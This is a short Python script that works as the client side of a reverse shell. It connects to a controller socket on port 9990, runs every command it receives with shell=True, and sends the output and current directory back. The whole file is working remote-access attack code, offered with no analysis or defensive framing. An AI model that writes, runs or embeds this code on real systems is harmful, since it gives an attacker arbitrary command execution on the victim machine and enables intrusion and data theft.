import socket
import os
import subprocess

BUFFER_SIZE=1024

HOST="0.0.0.0"
PORT=9990

#Creating client socket
s=socket.socket()

#Binding the port
s.connect((HOST,PORT))


while True:
	command=s.recv(BUFFER_SIZE)
	command=command.decode("utf-8")

	if len(command)>0:
		try:
			if command[:2]=="cd":
				PATH=command[3:]
				os.chdir(PATH)
		except:
			pass

    
		#Obtaining the terminal on client machine
		terminal=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
		stdout=terminal.stdout.read()
		stderr=terminal.stderr.read()

		if stdout:
			output_in_bytes=stdout
		else:
			output_in_bytes=stderr
		output_in_string=str(output_in_bytes,"utf-8")

		current_working_dir=os.getcwd()+">"

		send_data=str.encode(output_in_string+current_working_dir)

		s.send(send_data)

		print(output_in_string)
